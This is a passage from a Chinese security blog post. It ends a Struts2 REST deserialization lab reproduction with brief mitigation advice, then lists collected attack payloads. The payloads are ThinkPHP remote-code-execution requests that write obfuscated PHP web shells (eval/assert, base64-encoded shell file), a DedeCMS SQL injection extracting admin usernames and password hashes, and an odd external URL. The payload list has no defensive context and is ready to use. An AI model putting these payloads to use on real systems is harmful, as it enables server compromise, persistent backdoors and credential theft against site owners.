reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">   &lt;&#x2F;entry&gt;</span><br><span class="line"> &lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure>

<p>4、<strong>可以看到响应500状态码,不过还是成功了</strong></p>
<p>　　</p>
<p>5、在目标执行docker-compose exec struts2 ls /tmp/ 查看是否成功执行touch命令</p>
<p>　　</p>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、 升级版本</p>
<p>2、 删除Struts2 REST插件,或仅限于服务器普通页面和jsons:</p>
<p><code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,json&quot;/&gt;</code></p>
<p>3、限制服务端扩展类型,删除XML支持。</p>
<h1 id="看到的一些payload"><a href="#看到的一些payload" class="headerlink" title="看到的一些payload"></a>看到的一些payload</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;robots1.php&amp;content&#x3D;xbshell&lt;?php%20@eval($_POST[admin]);?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;12345.php&amp;vars[1][1]&#x3D;&lt;?php%20$poc%20&#x3D;&quot;axsxsxexrxt&quot;;$poc_1%20&#x3D;%20explode(&quot;x&quot;,%20$poc);%20$poc_2%20&#x3D;%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST[&#39;12345&#39;]))));?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;robots.php&amp;content&#x3D;xbshell1&lt;?php$password%20&#x3D;%20&quot;xinba&quot;;$ch%20&#x3D;%20explode(&quot;.&quot;,&quot;hello.ass.world.er.t&quot;);array_intersect_ukey(array($_REQUEST[$password]%20&#x3D;&gt;%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;@eval($_GET[%27fuck%27]);&amp;fuck&#x3D;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));</span><br><span class="line"></span><br><span class="line">&#x2F;plus&#x2F;recommend.php?action&#x3D;&amp;aid&#x3D;1&amp;_FILES[type][tmp_name]&#x3D;\%27%20or%20mid&#x3D;@&#96;\%27&#96;%20&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+&#96;%23@__admin&#96;%20limit+0,1),5,6,7,8,9%23@&#96;\%27&#96;+&amp;_FILES[type][name]&#x3D;1.jpg&amp;_FILES[type][type]&#x3D;application&#x2F;octet-stream&amp;_FILES[type][size]&#x3D;4294 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;godkey111fw.hk1008.webhost6.cn&#x2F;hmseo.txt?.php#.jpg</span><br></pre></td></tr></table></figure>


        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2020-03-23T09:30:32.263Z" itemprop="dateUpdated">2020-03-23 17:30:32</time>
</span><br>


        
        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/muggle/2020/03/23/3.23/" target="_blank" rel="external">https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/</a>
        
    </div>
    
    <footer>
        <a href="https://xiongmaozailushang.gitee.io/muggle">
            <img src="/muggle/img/avatar.jpg" alt="熊猫在路上">
            熊猫在路上
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/muggle/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/muggle/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/muggle/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/" rel="tag">注册表</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&title=《3-23》 — 熊猫在路上&pic=https://xiongmaozailushang.gitee.io/muggle/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&title=《3-23》 — 熊猫在路上&source=
                
                    
                    
                
..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《3-23》 — 熊猫在路上&url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&via=https://xiongmaozailushang.gitee.io/muggle" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/muggle/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">渗透面试题</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/muggle/2020/03/20/3.20/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">3-20</h4>
      </a>
    </div>
  
</nav>



    




















</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/muggle/false" alt="打赏二维码">
        </div>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>熊猫在路上 &copy; 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> 网站备案号： <a href="https://www.beian.miit.gov.cn" target="_blank">湘ICP备19018331号</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&title=《3-23》 — 熊猫在路上&pic=https://xiongmaozailushang.gitee.io/muggle/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&title=《3-23》 — 熊猫在路上&source=
                
                    
                    
                
..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《3-23》 — 熊猫在路上&url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/&via=https://xiongmaozailushang.gitee.io/muggle" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://xiongmaozailushang.gitee.io/muggle/2020/03/23/3.23/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/muggle/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '熊猫已经不再路上了！';
            clearTimeout(titleTime);
        } else {
            document.title = '熊猫在路上!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
